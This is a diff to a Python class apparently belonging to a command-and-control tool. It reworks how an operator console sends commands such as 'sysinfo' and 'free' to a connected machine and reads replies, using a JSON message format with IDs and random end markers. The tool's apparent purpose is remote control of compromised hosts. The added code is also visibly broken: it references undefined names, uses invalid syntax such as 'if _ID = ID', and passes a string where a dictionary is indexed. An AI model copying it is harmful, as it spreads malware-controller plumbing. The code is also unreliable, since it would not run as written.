@@ -21,11 +21,12 @@ class Dmos:
         self.interactive    = False
         self.c2             = c2
 
-
+    
     def interact(self):
         modules_multi = self.c2.modules_multi
-        cmdList = ["free", "sysinfo", "fat", "clear", "b"] + modules_multi.keys()
-        readline.set_completer(TabCompleter(cmdList).complete)
+        
+        #cmdList = ["free", "sysinfo", "fat", "clear", "b"] + modules_multi.keys()
+        #readline.set_completer(TabCompleter(cmdList).complete)
         while 1:
             command = Debug.prompt_input(f"[{self.USERNAME}@{self.GLOBAL}]>> ")
             cmd = command.split(' ')[0]
@@ -48,25 +49,45 @@ class Dmos:
             elif command == "b":
                 self.c2.multi_handler.cmdline()
 
-    def wrap_send(self, content, is_json=False):
-        if is_json : data = json.dumps(content)
+    def send_command(self, content):
+        """
+        {
+            'ID': [STRING]
+            'args': {
+                ...
+            }
+            'EOF': [INT]
+        }
+        """
+        
+        content['EOF'] = binascii.b2a_hex(os.urandom(8)) if content[EOF] != None else does_recieve = False
+        data = json.dumps(content)
         try: 
             self.conn.send(data.encode())
+            if does_recieve is not False:
+                return socket_recieve(content['ID'], content['EOF'])
         except:
             Debug.eprint("An unexpected error ocurred")
-    def wrap_recieve(self):
+            
+    def socket_recieve(self, ID, EOF):
+        _ID = json.loads(self.conn.recv(36))['ID']
         recv_data = ""
-        while 1:
-            try:
-                recv_data += self.conn.recv(1024).decode()
-                return recv_data
-            except ValueError:
-                continue
-            else:
-                Debug.eprint("An unexpected error ocurred")
+        if _ID = ID:
+            while (d := self.conn.recv(1024)):
+                try:
+                    if EOF not in d:
+                        recv_data += d
+                    else:
+                        return recv_data   
+                except ValueError:
+                    continue
+                else:
+                    Debug.eprint("An unexpected error ocurred")
 
     def free_dmos(self):
-        self.conn.send("free".encode())
+        _json_cmd = json.dumps({'ID': 'free', 'args': None, 'EOF': None})
+        self.send_command(_json_cmd)
+        
     def transfer(self, conn):
         """
         Macro function for interactive shell
